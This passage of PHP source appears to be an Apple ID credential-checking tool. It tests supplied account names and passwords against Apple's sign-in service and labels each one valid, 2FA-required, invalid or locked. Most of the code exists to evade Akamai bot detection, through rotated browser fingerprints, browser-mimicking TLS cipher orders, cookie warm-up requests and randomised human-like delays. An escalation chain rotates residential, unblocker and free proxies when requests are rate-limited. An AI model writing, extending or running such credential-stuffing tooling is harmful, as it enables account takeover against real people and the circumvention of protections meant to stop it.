     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Linux"'],

    ['tag' => 'linux_chrome_123', 'device' => 'desktop', 'os' => 'Linux', 'os_version' => '23.10',
     'browser' => 'Chrome', 'browser_version' => '123',
     'ua' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
     'platform' => 'Linux x86_64', 'vendor' => 'Google Inc.',
     'lang' => 'nl-NL', 'tz' => 'Europe/Amsterdam', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="99"',
     'sec_ch_ua_mobile' => '?0', 'sec_ch_ua_platform' => '"Linux"'],

    ['tag' => 'linux_firefox_125', 'device' => 'desktop', 'os' => 'Linux', 'os_version' => '22.04',
     'browser' => 'Firefox', 'browser_version' => '125',
     'ua' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
     'platform' => 'Linux x86_64', 'vendor' => '',
     'lang' => 'de-DE', 'tz' => 'Europe/Berlin', 'tz_offset' => 'GMT+01:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],

    ['tag' => 'linux_firefox_123', 'device' => 'desktop', 'os' => 'Linux', 'os_version' => 'Fedora 39',
     'browser' => 'Firefox', 'browser_version' => '123',
     'ua' => 'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
     'platform' => 'Linux x86_64', 'vendor' => '',
     'lang' => 'en-GB', 'tz' => 'Europe/London', 'tz_offset' => 'GMT+00:00',
     'sec_ch_ua' => null, 'sec_ch_ua_mobile' => null, 'sec_ch_ua_platform' => null],
];

// Track recent picks so consecutive auths use different fingerprints.
$_used_profiles = [];

// Recency window: how many recently-picked profiles to avoid re-using.
const FP_RECENCY_WINDOW = 5;

/**
 * Pick a random profile, biased away from the last FP_RECENCY_WINDOW used.
 * Optional filters allow constraining by device family or OS.
 *
 * @param string|null $device  'desktop' | 'mobile' | 'tablet' (null = any)
 * @param string|null $os      'macOS' | 'iOS' | 'iPadOS' | 'Windows' | 'Linux' (null = any)
 * @param string|null $browser 'Safari' | 'Chrome' | 'Firefox' | 'Edge' | etc. (null = any)
 */
function pick_profile(?string $device = null, ?string $os = null, ?string $browser = null): array
{
    global $BROWSER_PROFILES, $_used_profiles;

    $matches = array_filter($BROWSER_PROFILES, function ($p) use ($device, $os, $browser) {
        if ($device  !== null && ($p['device']  ?? null) !== $device)  return false;
        if ($os      !== null && ($p['os']      ?? null) !== $os)      return false;
        if ($browser !== null && ($p['browser'] ?? null) !== $browser) return false;
        return true;
    });

    // Defensive fallback: if filters yield nothing, ignore them.
    if (empty($matches)) {
        $matches = $BROWSER_PROFILES;
    }

    // Avoid the most-recently-used profiles when possible.
    $recent = array_slice($_used_profiles, -FP_RECENCY_WINDOW);
    $recentTags = array_column($recent, 'tag');
    $fresh = array_filter($matches, fn($p) => !in_array($p['tag'] ?? '', $recentTags, true));
    if (empty($fresh)) {
        $fresh = $matches;
        $_used_profiles = []; // reset rotation when the pool is exhausted
    }

    $profile = $fresh[array_rand($fresh)];
    $_used_profiles[] = $profile;
    return $profile;
}

/**
 * Build the Apple-OAuth header set for a chosen profile and return
 * [$headers, $profile]. Same return shape as the original implementation
 * so existing callers don't need to change.
 *
 * @param bool        $is_unblocker  add X-SU-* headers for the proxy unblocker
 * @param string|null $device_pref   pin the picker to a device family
 * @param string|null $os_pref       pin the picker to an OS
 * @param string|null $browser_pref  pin the picker to a browser
 */
function generate_fingerprint(
    bool $is_unblocker = false,
    ?string $device_pref = null,
    ?string $os_pref = null,
    ?string $browser_pref = null
): array {
    $profile = pick_profile($device_pref, $os_pref, $browser_pref);

    $client_id    = 'auth-' . strtolower(uniqid('', true));
    $session_uuid = sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );

    $fd_info = json_encode([
        'U' => $profile['ua'],
        'L' => $profile['lang'],
        'Z' => $profile['tz_offset'],
        'V' => '1.1',
        'F' => 'VGF0YXJ7' . base64_encode(substr($session_uuid, 0, 8)),
    ], JSON_UNESCAPED_SLASHES);

    $headers = [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: ' . $profile['lang'] . ',en;q=0.9',
        'Accept-Encoding: gzip, deflate, br',
        'Content-Type: application/json',
        'Origin: https://idmsa.apple.com',
        'Referer: https://idmsa.apple.com/',
        'User-Agent: ' . $profile['ua'],
        'X-Apple-Widget-Key: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
        'X-Apple-OAuth-Client-Id: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
        'X-Apple-OAuth-Client-Type: firstPartyAuth',
        'X-Apple-OAuth-Redirect-URI: https://www.icloud.com',
        'X-Apple-OAuth-Require-Grant-Code: true',
        'X-Apple-OAuth-Response-Mode: web_message',
        'X-Apple-OAuth-Response-Type: code',
        'X-Apple-OAuth-State: ' . $client_id,
        'X-Apple-I-FD-Client-Info: ' . $fd_info,
        'X-Apple-I-TimeZone: ' . $profile['tz'],
        'X-Requested-With: XMLHttpRequest',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
    ];

    // Chromium-only client hints. Real Safari/Firefox/iOS-WebKit do NOT send
    // these, so only emit them when the profile actually defines them.
    if (!empty($profile['sec_ch_ua'])) {
        $headers[] = 'Sec-CH-UA: ' . $profile['sec_ch_ua'];
        if (!empty($profile['sec_ch_ua_mobile'])) {
            $headers[] = 'Sec-CH-UA-Mobile: ' . $profile['sec_ch_ua_mobile'];
        }
        if (!empty($profile['sec_ch_ua_platform'])) {
            $headers[] = 'Sec-CH-UA-Platform: ' . $profile['sec_ch_ua_platform'];
        }
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Site: same-origin';
    }

    if ($is_unblocker) {
        $headers[] = 'X-SU-Force-Headers: 1';
        $headers[] = 'X-SU-Force-Cookies: 1';
        $headers[] = 'X-SU-Session-Id: ' . $session_uuid;
    }

    return [$headers, $profile];
}

// ============================================================================
// TLS / JA3 SHAPING
//
// Stock php-curl identifies itself as "vanilla libcurl" via JA3/JA4. Anti-bot
// systems (Apple, Akamai, Cloudflare, PerimeterX) use that fingerprint as a
// strong bot signal. We cannot achieve full Chrome/Safari JA3 parity in stock
// php-curl - OpenSSL hardcodes TLS extension order and GREASE values, and
// libcurl does not expose those knobs. But we CAN bend three components of
// the fingerprint that ARE exposed:
//
//   1. TLS protocol range  (1.2 .. 1.3)
//   2. TLS 1.2 cipher list ordering, browser-specific
//   3. TLS 1.3 cipher list ordering, browser-specific
//
// Plus we force HTTP/2 over TLS (browsers never use HTTP/1.1 over HTTPS in
// 2024) and force a fresh handshake per request so JA3 cannot be reused
// from a cached socket pool.
//
// This is "best effort" hardening - not a substitute for curl-impersonate.
// On cPanel where you cannot install native binaries it is the realistic
// ceiling.
// ============================================================================

/**
 * Cipher orderings observed on real Chrome/Safari/Firefox (122-125 / 17.x /
 * 122-125). These are the OpenSSL names; libcurl maps them to wire IDs.
 * Order matters - JA3 hashes the cipher list verbatim.
 */
function tls_cipher_lists_for_browser(string $browser): array
{
    switch ($browser) {
        case 'Safari':
            // macOS / iOS Safari 17.x. Note Safari leads with ECDHE-ECDSA*256.
            $tls12 = implode(':', [
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-SHA384',
                'ECDHE-RSA-AES256-SHA384',
                'ECDHE-ECDSA-AES256-SHA',
                'ECDHE-RSA-AES256-SHA',
                'ECDHE-ECDSA-AES128-SHA256',
                'ECDHE-RSA-AES128-SHA256',
                'ECDHE-ECDSA-AES128-SHA',
                'ECDHE-RSA-AES128-SHA',
                'AES256-GCM-SHA384',
                'AES128-GCM-SHA256',
                'AES256-SHA256',
                'AES128-SHA256',
                'AES256-SHA',
                'AES128-SHA',
            ]);
            // Safari 1.3 cipher order (post macOS 13)
            $tls13 = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256';
            break;

        case 'Firefox':
            // Firefox 122-125 (NSS-derived order, distinctive)
            $tls12 = implode(':', [
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-AES256-SHA',
                'ECDHE-ECDSA-AES128-SHA',
                'ECDHE-RSA-AES256-SHA',
                'ECDHE-RSA-AES128-SHA',
                'AES128-GCM-SHA256',
                'AES256-GCM-SHA384',
                'AES128-SHA',
                'AES256-SHA',
            ]);
            // Firefox swaps positions 2 and 3 vs Chrome - distinctive JA3 trait
            $tls13 = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384';
            break;

        case 'Chrome':
        case 'Edge':
        case 'Brave':
        case 'Opera':
        case 'Arc':
        default:
            // Chromium 122-125 cipher order. Edge/Brave/Opera/Arc share it.
            $tls12 = implode(':', [
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'AES128-GCM-SHA256',
                'AES256-GCM-SHA384',
                'AES128-SHA',
                'AES256-SHA',
            ]);
            $tls13 = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256';
            break;
    }
    return [$tls12, $tls13];
}

/**
 * Apply browser-shaped TLS / HTTP-version options to a cURL handle.
 * Pass the same $profile you got from generate_fingerprint() so the cipher
 * suite lines up with the User-Agent you are advertising (a Safari UA over
 * Chrome ciphers is itself a fingerprint).
 *
 * Safe to call multiple times. Calling with $profile=null still applies the
 * generic browser-grade defaults (HTTP/2, TLS 1.2-1.3, fresh handshake).
 */
function apply_browser_tls_profile($ch, ?array $profile = null): void
{
    // -------- HTTP version --------
    // CURL_HTTP_VERSION_2TLS = HTTP/2 only over TLS, HTTP/1.1 over plaintext.
    // That is exactly what Chrome/Safari/Firefox do; ALPN advertises "h2".
    $http_v = defined('CURL_HTTP_VERSION_2TLS')
        ? constant('CURL_HTTP_VERSION_2TLS')
        : (defined('CURL_HTTP_VERSION_2_0') ? constant('CURL_HTTP_VERSION_2_0') : 0);
    if ($http_v) curl_setopt($ch, CURLOPT_HTTP_VERSION, $http_v);

    if (defined('CURLOPT_SSL_ENABLE_ALPN')) {
        curl_setopt($ch, CURLOPT_SSL_ENABLE_ALPN, true);
    }
    // NPN is dead (deprecated in browsers since 2016). Disable it to avoid
    // advertising it - libcurl shipping with old OpenSSL still does by default.
    if (defined('CURLOPT_SSL_ENABLE_NPN')) {
        curl_setopt($ch, CURLOPT_SSL_ENABLE_NPN, false);
    }

    // -------- TLS version range --------
    // Browsers offer TLS 1.2 .. 1.3. Forcing this drops the SSL3/TLS1.0/1.1
    // version_list bytes from the ClientHello, matching real browsers.
    if (defined('CURL_SSLVERSION_TLSv1_2')) {
        $sslv = constant('CURL_SSLVERSION_TLSv1_2');
        if (defined('CURL_SSLVERSION_MAX_TLSv1_3')) {
            $sslv |= constant('CURL_SSLVERSION_MAX_TLSv1_3');
        }
        curl_setopt($ch, CURLOPT_SSLVERSION, $sslv);
    }

    // -------- Force fresh TLS handshake per request --------
    // Without this libcurl reuses sockets, which means the server only sees
    // a JA3 once per connection. For rotation to work each request must
    // negotiate a fresh handshake.
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, true);

    // -------- Cipher lists, ordered to match the chosen browser --------
    $browser = $profile['browser'] ?? 'Chrome';
    [$tls12, $tls13] = tls_cipher_lists_for_browser($browser);
    if ($tls12 !== '') {
        curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, $tls12);
    }
    if ($tls13 !== '' && defined('CURLOPT_TLS13_CIPHERS')) {
        curl_setopt($ch, CURLOPT_TLS13_CIPHERS, $tls13);
    }

    // -------- Sane SSL_OPTIONS --------
    // CURLSSLOPT_NO_PARTIALCHAIN: do not accept partial chains (browsers don't)
    // CURLSSLOPT_REVOKE_BEST_EFFORT: still validate but don't fail on missing
    // CRL endpoints (browsers do soft-fail).
    if (defined('CURLOPT_SSL_OPTIONS')) {
        $ssl_opts = 0;
        if (defined('CURLSSLOPT_NO_PARTIALCHAIN'))    $ssl_opts |= constant('CURLSSLOPT_NO_PARTIALCHAIN');
        if (defined('CURLSSLOPT_REVOKE_BEST_EFFORT')) $ssl_opts |= constant('CURLSSLOPT_REVOKE_BEST_EFFORT');
        if ($ssl_opts) curl_setopt($ch, CURLOPT_SSL_OPTIONS, $ssl_opts);
    }
}

// ============================================================================
// AKAMAI COOKIE WARMUP + HUMAN JITTER
//
// Apple's idmsa.apple.com sits behind Akamai Bot Manager. Its detection
// signals include:
//   - Whether the very first POST to /signin/init carries Akamai cookies
//     (bm_sv, _abck, bm_sz, ak_bmsc). A real browser landed on the page
//     first, ran the obfuscated JS sensor, and got those cookies. A bot
//     that POSTs cold has none.
//   - Inter-request timing. Sub-200ms between page-load and form-submit
//     is a near-certain bot signal.
//
// We can't run the JS sensor server-side, but we CAN do a real GET to the
// signin page first so Akamai's edge ships cookies into our jar. Then a
// human-like delay before the POST. Net effect: the auth POST looks like
// it came from a slow human on a real browser session, not a script.
// ============================================================================

/**
 * Top-level navigation headers (the Accept/Sec-Fetch values browsers send
 * when LOADING a page, not when XHR-ing). The Apple-OAuth/XHR headers are
 * intentionally excluded - sending them on a GET to a page would itself
 * be a fingerprint anomaly.
 */
function apple_browser_navigation_headers(array $profile): array
{
    $h = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: ' . ($profile['lang'] ?? 'en-US') . ',en;q=0.9',
        'Accept-Encoding: gzip, deflate, br',
        'User-Agent: ' . ($profile['ua'] ?? 'Mozilla/5.0'),
        'Cache-Control: no-cache',
        'Pragma: no-cache',
        'Upgrade-Insecure-Requests: 1',
    ];
    if (!empty($profile['sec_ch_ua'])) {
        $h[] = 'Sec-CH-UA: ' . $profile['sec_ch_ua'];
        if (!empty($profile['sec_ch_ua_mobile'])) {
            $h[] = 'Sec-CH-UA-Mobile: ' . $profile['sec_ch_ua_mobile'];
        }
        if (!empty($profile['sec_ch_ua_platform'])) {
            $h[] = 'Sec-CH-UA-Platform: ' . $profile['sec_ch_ua_platform'];
        }
        // Sec-Fetch values for top-level navigation (not XHR):
        $h[] = 'Sec-Fetch-Dest: document';
        $h[] = 'Sec-Fetch-Mode: navigate';
        $h[] = 'Sec-Fetch-Site: none';
        $h[] = 'Sec-Fetch-User: ?1';
    }
    return $h;
}

/**
 * GET https://idmsa.apple.com/appleauth/auth/signin to land Akamai cookies
 * (bm_sv, _abck, bm_sz, ak_bmsc) in the cookie jar BEFORE the SRP POST.
 *
 * Failure is non-fatal: caller continues with auth even if warmup didn't
 * land cookies. Worst case we are no worse off than the original behavior.
 *
 * Returns true if at least one Akamai cookie landed, false otherwise.
 */
function apple_cookie_warmup(string $cookie_jar, ?string $proxy, array $profile): bool
{
    $url = 'https://idmsa.apple.com/appleauth/auth/signin';
    $headers = apple_browser_navigation_headers($profile);

    $resp = curl_session_request('GET', $url, null, $headers, $proxy, 12, $cookie_jar, $profile);
    if ($resp['status'] === 0 || !empty($resp['error'])) {
        return false;
    }

    // Sanity: did Akamai actually push any of its expected cookies?
    $jar_contents = @file_get_contents($cookie_jar);
    if ($jar_contents === false || $jar_contents === '') return false;
    return preg_match('/(bm_sv|_abck|bm_sz|ak_bmsc)/i', $jar_contents) === 1;
}

/**
 * Random sleep to mimic human page-to-action latency. Akamai's bot
 * detector fingerprints inter-request timing - sub-200ms gaps between
 * page-load and form-submit are a near-certain bot signal.
 *
 * Default 800-2400ms covers "user just opened the page and hit submit
 * pretty quickly" without bloating throughput too much. Bump $min_ms /
 * $max_ms if Apple still 503s consistently.
 */
function apple_human_jitter(int $min_ms = 800, int $max_ms = 2400): void
{
    if ($min_ms < 0) $min_ms = 0;
    if ($max_ms < $min_ms) $max_ms = $min_ms;
    if ($max_ms === 0) return;
    usleep(mt_rand($min_ms, $max_ms) * 1000);
}

// ============================================================================
// CURL HELPER
// ============================================================================
function curl_request(string $method, string $url, ?string $body = null, array $headers = [], ?string $proxy = null, int $timeout = 15): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_ENCODING => '',
        CURLOPT_FOLLOWLOCATION => false,
    ]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($body !== null)
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    }
    $response = curl_exec($ch);
    $err = curl_error($ch);
    $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);

    if ($response === false) {
        return ['status' => 0, 'headers' => [], 'body' => '', 'error' => $err];
    }
    $raw_headers = substr($response, 0, $header_size);
    $body_str = substr($response, $header_size);

    // Parse response headers
    $resp_headers = [];
    foreach (explode("\r\n", $raw_headers) as $line) {
        if (strpos($line, ':') !== false) {
            [$key, $val] = explode(':', $line, 2);
            $resp_headers[trim($key)] = trim($val);
        }
    }
    return ['status' => $http_code, 'headers' => $resp_headers, 'body' => $body_str, 'error' => null];
}

function extract_tokens(array $resp_headers): array
{
    global $TOKEN_HEADERS;
    $tokens = [];
    foreach ($TOKEN_HEADERS as $header => $name) {
        // Case-insensitive header lookup
        foreach ($resp_headers as $k => $v) {
            if (strcasecmp($k, $header) === 0) {
                $tokens[$name] = $v;
            }
        }
    }
    return $tokens;
}

// ============================================================================
// AUTHENTICATION (SRP init → complete) with cookie session
// ============================================================================

/**
 * cURL request with cookie jar (emulates Python requests.Session).
 * Pass the profile returned by generate_fingerprint() as $profile so the
 * outgoing TLS handshake (cipher order, ALPN, HTTP version) lines up with
 * the browser advertised in the User-Agent header. See apply_browser_tls_profile().
 */
function curl_session_request(string $method, string $url, ?string $body, array $headers, ?string $proxy, int $timeout, string $cookie_jar, ?array $profile = null): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_ENCODING => '',
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_COOKIEJAR => $cookie_jar,
        CURLOPT_COOKIEFILE => $cookie_jar,
    ]);

    // Browser-shaped TLS / HTTP version. With $profile=null this still
    // applies generic browser defaults (HTTP/2, TLS 1.2-1.3, fresh handshake).
    apply_browser_tls_profile($ch, $profile);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($body !== null)
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    if ($proxy)
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    $err = curl_error($ch);
    $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    if ($response === false)
        return ['status' => 0, 'headers' => [], 'body' => '', 'error' => $err];
    $raw_headers = substr($response, 0, $header_size);
    $body_str = substr($response, $header_size);
    $resp_headers = [];
    foreach (explode("\r\n", $raw_headers) as $line) {
        if (strpos($line, ':') !== false) {
            [$key, $val] = explode(':', $line, 2);
            $resp_headers[trim($key)] = trim($val);
        }
    }
    return ['status' => $http_code, 'headers' => $resp_headers, 'body' => $body_str, 'error' => null];
}

function auth_attempt(string $apple_id, string $password, array $cfg, ?string $proxy = null): array
{
    $result = ['success' => false, 'status' => 'failed', 'status_code' => null, 'tokens' => [], 'error_message' => null];
    $cookie_jar = null;

    [$headers, $profile] = generate_fingerprint();
    $proxy_name = $proxy ? 'PROXY' : 'DIRECT';
    emit_log('debug', "  → {$proxy_name} | " . substr($profile['ua'], 0, 45) . '...');

    try {
        // SRP setup
        $srp_pw = new SrpPassword($password);
        $srp_client = new SrpClient($apple_id, $srp_pw);
        $A_bytes = $srp_client->startAuthentication();

        // === INIT ===
        $init_url = AUTH_ENDPOINT . '/signin/init';
        $init_data = json_encode([
            'a' => base64_encode($A_bytes),
            'accountName' => $apple_id,
            'protocols' => ['s2k', 's2k_fo'],
        ]);

        // Use cookie-jar session (like Python requests.Session)
        $cookie_jar = tempnam(sys_get_temp_dir(), 'srp_');

        // === WARMUP === land Akamai cookies on the signin page first.
        // A real user always GETs the signin page before POSTing the form;
        // skipping this leaves Akamai with no bm_sv/_abck/bm_sz cookies on
        // the very first POST, which is one of its strongest bot signals.
        $warm_ok = apple_cookie_warmup($cookie_jar, $proxy, $profile);
        emit_log('debug', '  ~ warmup ' . ($warm_ok ? 'cookies-OK' : 'no-cookies'));

        // Human-like delay between page-load and form-submit. Sub-200ms
        // is itself a bot signal; 800-2400ms passes inter-request
        // timing checks without crippling throughput.
        apple_human_jitter();

        $resp = curl_session_request('POST', $init_url, $init_data, $headers, $proxy, 15, $cookie_jar, $profile);
        emit_log('debug', "  ← init HTTP {$resp['status']}");

        $session_data = extract_tokens($resp['headers']);

        if ($resp['status'] === 503) {
            $result['status_code'] = 503;
            $result['error_message'] = '503 at init';
            @unlink($cookie_jar);
            return $result;
        }
        if ($resp['status'] !== 200) {
            $result['status_code'] = $resp['status'];
            $curl_err = !empty($resp['error']) ? " ({$resp['error']})" : '';
            $result['error_message'] = "init {$resp['status']}{$curl_err}";
            @unlink($cookie_jar);
            return $result;
        }

        $init = json_decode($resp['body'], true);
        if (!$init || !isset($init['salt'], $init['b'], $init['c'], $init['iteration'], $init['protocol'])) {
            $result['error_message'] = 'Invalid init response';
            @unlink($cookie_jar);
            return $result;
        }

        $salt = base64_decode($init['salt']);
        $B_raw = base64_decode($init['b']);
        $c = $init['c'];
        $iterations = (int)$init['iteration'];
        $protocol = $init['protocol'];

        emit_log('debug', "  ← protocol={$protocol} iter={$iterations} salt_len=" . strlen($salt) . " B_len=" . strlen($B_raw));

        // Human delay
        if ($cfg['human_delay'] ?? true) {
            $delay = 0.5 + (mt_rand(0, 50) / 100); // 0.50 – 1.00s
            usleep((int)($delay * 1000000));
        }

        // === COMPLETE ===
        $srp_pw->setEncryptInfo($salt, $iterations, 32, $protocol);
        $M1 = $srp_client->processChallenge($salt, $B_raw);

        $complete_url = AUTH_ENDPOINT . '/signin/complete?isRememberMeEnabled=true';

        // Add session headers
        if (isset($session_data['session_id'])) {
            $headers[] = 'X-Apple-ID-Session-Id: ' . $session_data['session_id'];
        }
        if (isset($session_data['scnt'])) {
            $headers[] = 'scnt: ' . $session_data['scnt'];
        }

        $complete_data = json_encode([
            'accountName' => $apple_id,
            'c' => $c,
            'm1' => base64_encode($M1),
            'm2' => base64_encode($srp_client->H_AMK),
            'rememberMe' => true,
            'trustTokens' => [],
        ]);

        emit_log('debug', '  → M1: ' . substr(base64_encode($M1), 0, 30) . '...');

        // Smaller jitter between init response and complete - real browsers
        // need ~200-700ms to do the SRP math and re-render the form before
        // sending the second POST.
        apple_human_jitter(200, 700);

        $resp = curl_session_request('POST', $complete_url, $complete_data, $headers, $proxy, 15, $cookie_jar, $profile);
        emit_log('debug', "  ← complete HTTP {$resp['status']}");

        $complete_tokens = extract_tokens($resp['headers']);
        $session_data = array_merge($session_data, $complete_tokens);
        $result['status_code'] = $resp['status'];
        $result['tokens'] = $session_data;

        if ($resp['status'] === 503) {
            $result['error_message'] = '503 at complete';
            @unlink($cookie_jar);
            return $result;
        }
        if ($resp['status'] === 0) {
            $curl_err = !empty($resp['error']) ? " ({$resp['error']})" : '';
            $result['error_message'] = "complete connection failed{$curl_err}";
            @unlink($cookie_jar);
            return $result;
        }

        switch ($resp['status']) {
            case 200:
                $result['success'] = true;
                $result['status'] = 'success';
                break;
            case 409:
                $result['success'] = true;
                $result['status'] = '2fa_required';
                break;
            case 401:
                $result['error_message'] = 'Invalid credentials';
                break;
            case 403:
                $result['error_message'] = 'Account locked';
                break;
            default:
                $result['error_message'] = "Unknown: {$resp['status']}";
                break;
        }
        @unlink($cookie_jar);
        return $result;

    }
    catch (\Throwable $e) {
        $result['error_message'] = get_class($e) . ': ' . substr($e->getMessage(), 0, 80);
        if ($cookie_jar) @unlink($cookie_jar);
        return $result;
    }
}

// ============================================================================
// PROXY MANAGER
// ============================================================================
function get_proxy_url(string $mode, array $cfg): ?string
{
    static $current_port_idx = 0;
    if ($mode === 'direct' || $mode === 'direct_aggressive')
        return null;
    if ($mode === 'free_proxy') {
        return free_proxy_next();
    }
    if ($mode === 'gitproxy') {
        return gitproxy_next();
    }
    if (($mode === 'unblocker') && ($cfg['unblocker_user'] ?? '')) {
        return "https://{$cfg['unblocker_user']}:{$cfg['unblocker_pass']}@{$cfg['unblocker_host']}:{$cfg['unblocker_port']}";
    }
    if (($mode === 'residential' || $mode === 'proxy') && ($cfg['proxy_user'] ?? '')) {
        $start = (int)$cfg['proxy_port_start'];
        $end = (int)$cfg['proxy_port_end'];
        $port = $start + ($current_port_idx % ($end - $start + 1));
        $current_port_idx++;
        return "http://{$cfg['proxy_user']}:{$cfg['proxy_pass']}@{$cfg['proxy_host']}:{$port}";
    }
    return null;
}

// ============================================================================
// ESCALATION ENGINE (Smart multi-strategy auth)
// ============================================================================
function build_escalation_chain(array $cfg): array
{
    global $last_success_mode;
    $mode = $cfg['mode'];
    $has_res = !empty($cfg['proxy_user']);
    $has_unb = !empty($cfg['unblocker_user']);
    $all_modes = [];

    if ($mode === 'smart') {
        $all_modes = ['direct'];
        if ($has_res)
            $all_modes[] = 'residential';
        if ($has_unb)
            $all_modes[] = 'unblocker';
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'direct') {
        $all_modes = ['direct'];
        if ($has_res)
            $all_modes[] = 'residential';
        if ($has_unb)
            $all_modes[] = 'unblocker';
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
    }
    elseif ($mode === 'gitproxy') {
        $all_modes = ['gitproxy'];
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'free_proxy') {
        $all_modes = ['free_proxy'];
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'proxy' || $mode === 'residential') {
        $all_modes = ['residential'];
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'unblocker') {
        $all_modes = ['unblocker'];
        if ($has_res)
            $all_modes[] = 'residential';
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    else {
        $all_modes = [$mode, 'gitproxy', 'free_proxy', 'direct_aggressive'];
    }

    // Smart reorder: if last_ok mode is in pool, move to front
    if ($last_success_mode && in_array($last_success_mode, $all_modes) && $all_modes[0] !== $last_success_mode) {
        $all_modes = array_values(array_diff($all_modes, [$last_success_mode]));
        array_unshift($all_modes, $last_success_mode);
        emit_log('debug', "  ♻️ Chain reordered: " . strtoupper($last_success_mode) . " succeeded last → goes first");
    }

    $labels = ['direct' => 'DIRECT', 'residential' => 'RESIDENTIAL', 'unblocker' => 'UNBLOCKER', 'free_proxy' => 'FREE-PROXY', 'gitproxy' => 'GIT-PROXY', 'direct_aggressive' => 'DIRECT-AGG'];
    $retries_map = ['direct' => 2, 'residential' => 2, 'unblocker' => 2, 'gitproxy' => 3, 'free_proxy' => 3, 'direct_aggressive' => 1];
    $chain = [];
    $cumulative_503 = 0;
    foreach ($all_modes as $i => $m) {
        $label = $labels[$m] ?? strtoupper($m);
        if ($i > 0)
            $label .= '↑';
        $chain[] = ['mode' => $m, 'label' => $label, 'retries' => $retries_map[$m] ?? 1, 'trigger_after_503' => $cumulative_503];
        $cumulative_503 += $retries_map[$m] ?? 1;
    }
    return $chain;
}

